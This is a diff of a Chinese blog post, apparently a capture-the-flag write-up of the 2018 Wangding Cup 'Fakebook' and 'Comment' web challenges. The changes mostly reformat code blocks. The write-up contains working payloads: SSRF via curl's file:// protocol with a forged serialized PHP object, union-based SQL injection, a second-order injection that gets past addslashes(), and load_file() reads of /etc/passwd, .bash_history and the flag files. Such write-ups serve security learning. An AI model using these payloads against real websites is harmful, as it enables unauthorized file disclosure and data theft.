@@ -63,7 +63,7 @@
         "description": "今年的网鼎杯也快要来了，就想找上一届的 ctf 题目来看看，正好发现buuctf上面有三个 web (Fakebook，Comment，Unfinish)，但最后一题不知道是我……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  1985 ,
+        "wordCount":  1863 ,
         "image": ["https://oss.zjun.info/zjun.info/18wdb-1.png","https://oss.zjun.info/zjun.info/18wdb-2.png","https://oss.zjun.info/zjun.info/18wdb-3.png","https://oss.zjun.info/zjun.info/18wdb-4.png","https://oss.zjun.info/zjun.info/18wdb-5.png","https://oss.zjun.info/zjun.info/18wdb-6.png","https://oss.zjun.info/zjun.info/18wdb-7.png","https://oss.zjun.info/zjun.info/18wdb-8.png","https://oss.zjun.info/zjun.info/18wdb-9.png","https://oss.zjun.info/zjun.info/18wdb-10.png"],
         "publisher": {
             "@type": "Organization",
@@ -283,54 +283,7 @@
 <li>ssrf</li>
 </ul>
 <p>存在有 <code>robots</code> 文件，访问之得到源码地址 <code>/user.php.bak</code> ，于是下载</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
@@ -373,9 +326,7 @@
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>一个 <code>UserInfo</code> 类，前面都是一些传参，主要的点在 <code>get</code> 方法中，其次 <code>isValidBlog</code> 方法对用户输入进行了过滤。</p>
+</span></span></code></pre></div><p>一个 <code>UserInfo</code> 类，前面都是一些传参，主要的点在 <code>get</code> 方法中，其次 <code>isValidBlog</code> 方法对用户输入进行了过滤。</p>
 <p>看 <code>get</code> 方法，先初始化 <code>curl</code> 会话，设置一个 <code>url</code> 链接，然后第二个 <code>curl_setopt</code> 里面是 <code>1</code> ，表示如果成功只将结果返回，不输出任何内容。如果失败返回 <code>FALSE</code> ，随即运行 <code>curl</code> ，并返回执行结果。 <code>$httpCode</code> 用来获取 <code>http</code> 状态码。</p>
 <p>分析了定义的 <code>get</code> 方法后，我们再来简单了解下 <code>curl</code> 的用法及特性，而且后面注册输入博客 <code>url</code> 时是会加载的，综合这些信息，可容易得出由于对 <code>curl</code> 控制不严导致存在 <code>ssrf</code> 漏洞， <code>curl</code> 支持多种协议：</p>
 <pre tabindex="0"><code>Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp
@@ -399,22 +350,7 @@
 <pre tabindex="0"><code>1zjundad271d633ebcf4f364ab8976fc5ea5035360d5420fc644a41cadc1b6098c98b901cf8c8609207dd774f2996c542115a20e36c9e06d0ec0f97dcedec30d59db6O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;zjun&#34;;s:3:&#34;age&#34;;i:19;s:4:&#34;blog&#34;;s:21:&#34;https://www.zjun.info&#34;;}
 </code></pre><p><code>data</code> 列存储的数据是序列化的字符串，可以利用前面的 <code>ssrf</code> 配合 <code>file</code> 协议构造 <code>paylod</code> 读取 <code>flag</code> 文件</p>
 <p>先构造 <code>pop</code> 链（其实不构造也行，直接把上面的 <code>博客地址</code> 改成 <code>flag 路径</code> ，再改下 <code>字符长度</code> 传过去即可）</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -425,9 +361,7 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">blog</span><span class="o">=</span><span class="s2">&#34;file:///var/www/html/flag.php&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><code>php</code> 执行一下输出</p>
+</span></span></span></code></pre></div><p><code>php</code> 执行一下输出</p>
 <pre tabindex="0"><code>O:8:&#34;UserInfo&#34;:3：{s:4:&#34;name&#34;;s:4:&#34;zjun&#34;;s:3:&#34;age&#34;;i:0;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}
 </code></pre><p>最终 <code>payload</code> ：</p>
 <p><code>view.php?no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;zjun&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}'#</code></p>
@@ -436,21 +370,11 @@
 </code></pre><p><code>base64</code> 解码：</p>
 <pre tabindex="0"><code>echo &#39;PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s5NGQ4OTk2OS04NTQyLTQwZGEtYjdiZS1kODMzNmM3NWVjMWR9IjsNCmV4aXQoMCk7DQo=&#39; | base64 -d
 </code></pre><p>得 <code>flag</code> ：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="s2">&#34;flag{94d89969-8542-40da-b7be-d8336c75ec1d}&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>除此之外还存在一<font color=red>非预期</font>解法，由于有较高权限以及可用 <code>load_file()</code> 函数，所以可以直接构造 <code>payload</code> ：</p>
+</span></span></code></pre></div><p>除此之外还存在一<font color=red>非预期</font>解法，由于有较高权限以及可用 <code>load_file()</code> 函数，所以可以直接构造 <code>payload</code> ：</p>
 <p><code>/view.php?no=0 union/**/select 1,load_file('/var/www/html/flag.php'),3,4#</code></p>
 <p>然后查看源码直接可得 <code>flag</code></p>
 <h2 id="comment"><a href="#comment" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:comment" class="headings">Comment</a></h2>
@@ -489,56 +413,7 @@ Date:   Sat Aug 11 22:47:29 2018 +0800
 </code></pre><p>把第一行版本源码恢复出来</p>
 <p><code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code></p>
 <p>得到完整源码</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;mysql.php&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;yes&#39;</span><span class="p">){</span>
@@ -583,9 +458,7 @@ Date:   Sat Aug 11 22:47:29 2018 +0800
 </span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./index.php&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>审计代码发现当 <code>get</code> 传入的 <code>do=write</code> 时，利用 <code>addslashes()</code> 函数对 <code>post</code> 传入的变量进行转义，在每个双引号 <code>&quot;</code> 前添加反斜杠</p>
+</span></span></span></code></pre></div><p>审计代码发现当 <code>get</code> 传入的 <code>do=write</code> 时，利用 <code>addslashes()</code> 函数对 <code>post</code> 传入的变量进行转义，在每个双引号 <code>&quot;</code> 前添加反斜杠</p>
 <pre tabindex="0"><code>$category = addslashes($_POST[&#39;category&#39;]);
 $title = addslashes($_POST[&#39;title&#39;]);
 $content = addslashes($_POST[&#39;content&#39;]);
@@ -593,36 +466,16 @@ $content = addslashes($_POST[&#39;content&#39;]);
 <pre tabindex="0"><code>$bo_id = addslashes($_POST[&#39;bo_id&#39;]);
 </code></pre><p>源码中的 <code>write</code> 和 <code>comment</code> 分别对应 <code>发帖</code> 和 <code>留言</code> 界面，结合二者和题目靶机结构，可以构造代码完成二次注入的操作。</p>
 <p>下面来看看具体如何实现，留言界面，构造 <code>sql</code> 语句，源码是：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
 </span></span></span><span class="line"><span class="cl"><span class="s2">        set category = &#39;</span><span class="si">$category</span><span class="s2">&#39;,
 </span></span></span><span class="line"><span class="cl"><span class="s2">            content = &#39;</span><span class="si">$content</span><span class="s2">&#39;,
 </span></span></span><span class="line"><span class="cl"><span class="s2">            bo_id = &#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>构造如下：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
+</span></span></code></pre></div><p>构造如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
 </span></span></span><span class="line"><span class="cl"><span class="s2">        set category = &#39;&#39;,content=user(),/*&#39;,
 </span></span></span><span class="line"><span class="cl"><span class="s2">            content = &#39;*/#&#39;,
 </span></span></span><span class="line"><span class="cl"><span class="s2">            bo_id = &#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>发帖时，通过 <code>addslashes()</code> 函数转义存入数据库，再从数据库中查询放入 <code>sql</code> 语句，显示出来，这里没有进行转义，所以在留言时利用多行注释符 <code>/**/</code> 即可闭合 <code>sql</code> 语句，执行我们的查询内容。</p>
+</span></span></code></pre></div><p>发帖时，通过 <code>addslashes()</code> 函数转义存入数据库，再从数据库中查询放入 <code>sql</code> 语句，显示出来，这里没有进行转义，所以在留言时利用多行注释符 <code>/**/</code> 即可闭合 <code>sql</code> 语句，执行我们的查询内容。</p>
 <p>来看看效果：</p>
 <p><img src="https://oss.zjun.info/zjun.info/18wdb-4.png" alt="18wdb-4"></p>
 <p>然后查看详情，留言处将其闭合：</p>
@@ -631,103 +484,37 @@ $content = addslashes($_POST[&#39;content&#39;]);
 <p><img src="https://oss.zjun.info/zjun.info/18wdb-6.png" alt="18wdb-6"></p>
 <p>接下来我们可以利用 <code>sql</code> 语句查询或配合 <code>load_file()</code> 函数读取服务器文件，直到读取到 <code>flag</code> 即可</p>
 <p>读 <code>/etc/passwd</code> :</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=load_file(&#34;/etc/passwd&#34;),/*
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/18wdb-7.png" alt="18wdb-7"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=load_file(&#34;/etc/passwd&#34;),/*
+</span></span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/18wdb-7.png" alt="18wdb-7"></p>
 <p>最后一行可见 <code>www</code> 以 <code>bash</code> 身份运行，读 <code>bash</code> 历史操作 <code>/home/www/.bash_history</code> ：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=load_file(&#34;/home/www/.bash_history&#34;),/*
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/18wdb-8.png" alt="18wdb-8"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=load_file(&#34;/home/www/.bash_history&#34;),/*
+</span></span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/18wdb-8.png" alt="18wdb-8"></p>
 <p>格式化一下操作如下：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /tmp/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /tmp/
 </span></span><span class="line"><span class="cl">unzip html.zip
 </span></span><span class="line"><span class="cl">rm -f html.zip
 </span></span><span class="line"><span class="cl">cp -r html /var/www/
 </span></span><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html/
 </span></span><span class="line"><span class="cl">rm -f .DS_Store
 </span></span><span class="line"><span class="cl">service apache2 start
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>注意 <code>/var/www/html</code> 中的 <code>.DS_Store</code> 被删除了，但是 <code>/tmp/html</code> 下的该文件还存在，读之（外加一层 <code>hex</code> 编码，不然会显示不全）：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=hex(load_file(&#34;/tmp/html/.DS_Store&#34;)),/*
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/18wdb-9.png" alt="18wdb-9"></p>
+</span></span></code></pre></div><p>注意 <code>/var/www/html</code> 中的 <code>.DS_Store</code> 被删除了，但是 <code>/tmp/html</code> 下的该文件还存在，读之（外加一层 <code>hex</code> 编码，不然会显示不全）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=hex(load_file(&#34;/tmp/html/.DS_Store&#34;)),/*
+</span></span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/18wdb-9.png" alt="18wdb-9"></p>
 <p>字符很多，用<a href="http://tools.hackxc.cc/bm/" target="_blank" rel="noopener">小陈师傅的在线工具</a>解码一下，可发现不是很清晰的 <code>flag_8946e1ff1ee3e40f.php</code> 字样</p>
 <p><img src="https://oss.zjun.info/zjun.info/18wdb-10.png" alt="18wdb-10"></p>
 <p>又读之</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=hex(load_file(&#34;/tmp/html/flag_8946e1ff1ee3e40f.php&#34;)),/*
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>解码后得假的 <code>flag</code></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=hex(load_file(&#34;/tmp/html/flag_8946e1ff1ee3e40f.php&#34;)),/*
+</span></span></span></code></pre></div><p>解码后得假的 <code>flag</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="s1">&#39;flag{f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b}&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>换个目录读，因为是复制过来的， <code>/var/www/html/</code> 中也自然有这个 <code>flag</code> 文件，读之</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=hex(load_file(&#34;/var/www/html/flag_8946e1ff1ee3e40f.php&#34;)),/*
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>得真 <code>flag</code></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></span></code></pre></div><p>换个目录读，因为是复制过来的， <code>/var/www/html/</code> 中也自然有这个 <code>flag</code> 文件，读之</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;,content=hex(load_file(&#34;/var/www/html/flag_8946e1ff1ee3e40f.php&#34;)),/*
+</span></span></span></code></pre></div><p>得真 <code>flag</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"> <span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;flag{362afbce-ac8e-438f-b969-9b1ce19f874b}&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table></div>
-</div>
-</div>
+</span></span></span></code></pre></div>
             </div>
 
             
